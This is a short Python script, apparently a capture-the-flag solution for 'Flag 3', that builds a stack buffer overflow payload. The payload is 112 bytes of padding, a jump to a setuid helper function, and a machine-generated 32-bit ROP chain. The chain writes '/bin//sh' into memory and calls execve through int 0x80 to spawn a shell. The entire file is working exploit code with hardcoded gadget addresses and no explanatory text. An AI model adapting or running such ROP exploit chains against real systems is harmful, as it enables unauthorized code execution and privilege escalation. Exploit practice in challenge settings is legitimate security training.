import struct
import telnetlib

def p(x):
    return struct.pack('<L', x)

let_me_help_you = 0x804889b

# Flag 3
payload = ""
payload += "P"*112  # Add the padding leading to the overflow

# First set uid
payload += p(let_me_help_you)

# Following was auto-generated using rop-gadget
payload += p(0x0806ed2a) # pop edx ; ret
payload += p(0x080ea060) # @ .data
payload += p(0x080b7e76) # pop eax ; ret
payload += '/bin'
payload += p(0x080547cb) # mov dword ptr [edx], eax ; ret
payload += p(0x0806ed2a) # pop edx ; ret
payload += p(0x080ea064) # @ .data + 4
payload += p(0x080b7e76) # pop eax ; ret
payload += '//sh'
payload += p(0x080547cb) # mov dword ptr [edx], eax ; ret
payload += p(0x0806ed2a) # pop edx ; ret
payload += p(0x080ea068) # @ .data + 8
payload += p(0x08049413) # xor eax, eax ; ret
payload += p(0x080547cb) # mov dword ptr [edx], eax ; ret
payload += p(0x080481c9) # pop ebx ; ret
payload += p(0x080ea060) # @ .data
payload += p(0x080de641) # pop ecx ; ret
payload += p(0x080ea068) # @ .data + 8
payload += p(0x0806ed2a) # pop edx ; ret
payload += p(0x080ea068) # @ .data + 8
payload += p(0x08049413) # xor eax, eax ; ret
payload += p(0x0807a56f) # inc eax ; ret
payload += p(0x0807a56f) # inc eax ; ret
payload += p(0x0807a56f) # inc eax ; ret
payload += p(0x0807a56f) # inc eax ; ret
payload += p(0x0807a56f) # inc eax ; ret
payload += p(0x0807a56f) # inc eax ; ret
payload += p(0x0807a56f) # inc eax ; ret
payload += p(0x0807a56f) # inc eax ; ret
payload += p(0x0807a56f) # inc eax ; ret
payload += p(0x0807a56f) # inc eax ; ret
payload += p(0x0807a56f) # inc eax ; ret
payload += p(0x0806c8c5) # int 0x80

print(payload)
